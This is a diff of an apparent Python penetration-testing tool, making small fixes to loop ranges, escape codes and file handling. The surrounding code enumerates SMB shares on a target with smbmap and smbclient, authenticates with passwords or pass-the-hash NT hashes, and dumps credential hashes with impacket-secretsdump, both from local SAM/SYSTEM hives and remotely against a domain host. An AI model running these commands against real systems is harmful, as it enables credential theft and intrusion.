@@ -270,7 +270,7 @@ def privCheck():
       print("[i] More than one ticket was found...")
    else:
       print("[i] One ticket was found...")               
-   for x in range(0, count): # 1 count+1
+   for x in range(1, count+1):
       ticket = linecache.getline("ticket.tmp", x).rstrip("\n")
       print("\n[+] " + ticket + "\n")
       ticket = ticket.rstrip(" ")
@@ -917,10 +917,10 @@ colour5 = "white"
 colour6 = "green"
 colour7 = "yellow"
 colour8 = "magenta"
-Yellow  = '\e[1;93m'							# OP SYSTEM COLOUR
-Green   = '\e[0;32m'
-Reset   = '\e[0m'
-Red     = '\e[1;91m'
+Yellow  = '\\e[1;93m'							# OP SYSTEM COLOUR
+Green   = '\\e[0;32m'
+Reset   = '\\e[0m'
+Red     = '\\e[1;91m'
 dataDir = "ROGUEAGENT"							# LOCAL DIRECTORYS
 httpDir = "TREADSTONE"
 workDir = "BLACKBRIAR"
@@ -2300,8 +2300,7 @@ while True:
                remoteCOM("smbmap --no-banner -H" + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > shares1.tmp") # No --no-pass setting
             else:   
                remoteCOM("smbmap --no-banner -H" + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > shares1.tmp")
-         cutLine("NT_STATUS_RESOURCE_NAME_NOT_FOUND","shares1.tmp")      
-         catsFile("shares1.tmp")             
+         catsFile("shares1.tmp")         
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")            
             remoteCOM("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + " --pw-nt-hash " + NTM.rstrip(" ") + " > shares2.tmp")
@@ -2309,9 +2308,9 @@ while True:
             if PAS.rstrip(" ") == "''":
                remoteCOM("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + " --password=" + PAS.rstrip(" ") + " -no-pass > shares2.tmp")
             else:
-               remoteCOM("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + " --password=" + PAS.rstrip(" ") + " > shares2.tmp")                           
+               remoteCOM("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + " --password=" + PAS.rstrip(" ") + " > shares2.tmp")               
          cutLine("Enter WORKGROUP", "shares2.tmp")
-         cutLine("Password for [WORKGROUP\]", "shares2.tmp")    
+         cutLine("Password for [WORKGROUP\\]", "shares2.tmp") 
          catsFile("shares2.tmp")         
          bonusCheck = linecache.getline("shares2.tmp", 1)
          if "session setup failed: NT_STATUS_PASSWORD_MUS" in bonusCheck:
@@ -2330,7 +2329,7 @@ while True:
             cutLine("---------","shares2.tmp")
             cutLine("^$","shares2.tmp")
             remoteCOM("sed -i 's/^[ \t]*//' shares2.tmp")
-            remoteCOM("mv shares2.tmp " + dataDir + "/shares.txt")
+            remoteCOM("cp shares2.tmp " + dataDir + "/shares.txt")
          with open(dataDir + "/shares.txt", "r") as shares:
             for x in range(0, maxUser):
                 SHAR[x] = shares.readline().rstrip(" ")
@@ -3497,7 +3496,7 @@ while True:
                localCOM("cut -f4 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/hashes.txt")  
             else:
                print("[+] Found SAM and SYSTEM...")
-               localCOM("impacket-secretsdump -system ./" + workDir + "/SYSTEM -sam ./" + workDir + "/SAM -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile  ./" + workDir + "/sam-extract.sam > log.tmp")
+               localCOM("impacket-secretsdump -system ./" + workDir + "/SYSTEM -sam ./" + workDir + "/SAM -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile  ./" + workDir + "/sam-extract > log.tmp")
                cutLine("[*]", workDir + "/sam-extract.sam")
                cutLine("[-]", workDir + "/sam-extract.sam")
                localCOM("cut -f1 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/usernames.txt")
@@ -4390,7 +4389,7 @@ while True:
             remoteCOM(keyPath + "impacket-secretsdump '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + "' > secrets.tmp")
          else:
             print("[i] Using HASH value as password credential...")
-            remoteCOM(keyPath + "impacket-secretsdump '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "' -hashes ':" + NTM.rstrip(" ") + "' > secrets.tmp")                        
+            remoteCOM("/usr/bin/impacket-secretsdump '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "' -hashes ':" + NTM.rstrip(" ") + "' > secrets.tmp")                        
          localCOM("sed -i '/:::/!d' secrets.tmp")
          localCOM("sort -u secrets.tmp > ssecrets.tmp")         
          count = lineCount("ssecrets.tmp")               	
